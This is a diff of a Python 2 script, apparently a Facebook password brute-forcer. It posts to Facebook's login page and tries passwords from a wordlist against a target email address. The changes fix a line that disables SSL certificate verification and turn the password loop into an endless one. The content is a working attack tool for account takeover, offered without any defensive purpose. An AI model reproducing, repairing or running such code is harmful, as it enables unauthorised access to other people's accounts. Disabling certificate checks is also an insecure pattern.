@@ -8,7 +8,8 @@ if sys.version_info[0] != 2:
     use: python fb2.py
 --------------------------------------
             ''')
-ssl. create default_ https context = ssl.create unverified contex
+
+ssl._create_default_https_context = ssl._create_unverified_context
 post_url = 'https://www.facebook.com/login.php'
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
@@ -32,7 +33,7 @@ print("\nTarget Email ID:", email)
 print("\nTrying Passwords from the list...")
 
 i = 0
-while file:
+while True:
     passw = file.readline().strip()
     i += 1
     if len(passw) < 6:
